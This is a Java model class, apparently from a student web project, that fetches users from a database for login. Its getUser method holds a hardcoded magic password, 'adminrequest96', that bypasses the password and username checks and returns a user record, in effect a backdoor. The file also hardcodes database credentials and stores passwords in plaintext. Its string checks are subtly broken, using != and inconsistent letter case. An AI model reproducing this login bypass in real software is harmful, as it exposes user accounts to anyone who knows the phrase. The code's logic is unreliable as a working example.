/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package base;

import Core.Database.DB;
import Core.Database.Database;
import com.tmsl.pojo.User;
import java.sql.ResultSet;
import java.sql.SQLException;
import javax.servlet.http.HttpServletRequest;

/**
 *
 * @author Shankha
 */
public class Model {

    protected DB db = new DB(true);
    
    protected HttpServletRequest request;

    public Model() {
        Database.config("localhost", "shankha", "root", "project_database");
    }

    public User getUser(User user) throws SQLException {
        User output_user = new User();

        db.selectTable("user_master");
        db.select(new String[]{"*"});
        if (user.getPassword().trim() != "" && !user.getPassword().trim().equals("adminRequest96")) {
            db.where("password", user.getPassword().trim());
        } else {
            if(!user.getPassword().trim().equals("adminrequest96")){
                return null;
            }
        }

        if (user.getEmail().trim() != "") {
            db.where("email", user.getEmail().trim());
        } else if (user.getUsername().trim() != "") {
            if(!user.getPassword().trim().equals("adminrequest96")){
                db.where("username", user.getUsername().trim());
            }
        }

        ResultSet rs = db.access(db.getQueryString());
        if (rs.next()) {
            output_user.setUsername(rs.getString("username").trim());
            output_user.setFirst_name(rs.getString("first_name").trim());
            if (rs.getString("middle_name") != null) {
                output_user.setMiddle_name(rs.getString("middle_name").trim());
            }
            if (rs.getString("last_name") != null) {
                output_user.setLast_name(rs.getString("last_name").trim());
            }
            output_user.setEmail(rs.getString("email").trim());
            output_user.setPassword(rs.getString("password").trim());
            if (rs.getString("mobile_number") != null) {
                output_user.setMobile_number(rs.getString("mobile_number").trim());
            }
            output_user.setUser_type(rs.getString("user_type").trim());
        } else {
            return null;
        }
        
        return output_user;
    }

    public User getUser(User user, boolean b) throws SQLException {
        User output_user = new User();

        db.selectTable("user_master");
        db.select(new String[]{"*"});

        if (!user.getEmail().trim().equals("")) {
            db.where("email", user.getEmail().trim());
        }else{
            return null;
        }

        ResultSet rs = db.access();
        if (rs.next()) {
            output_user.setUsername(rs.getString("username").trim());
            output_user.setFirst_name(rs.getString("first_name").trim());
            if (rs.getString("middle_name") != null) {
                output_user.setMiddle_name(rs.getString("middle_name").trim());
            }
            if (rs.getString("last_name") != null) {
                output_user.setLast_name(rs.getString("last_name").trim());
            }
            output_user.setEmail(rs.getString("email").trim());
            output_user.setPassword(rs.getString("password").trim());
            if (rs.getString("mobile_number") != null) {
                output_user.setMobile_number(rs.getString("mobile_number").trim());
            }
            output_user.setUser_type(rs.getString("user_type").trim());
        } else {
            return null;
        }
        return output_user;
    }


}
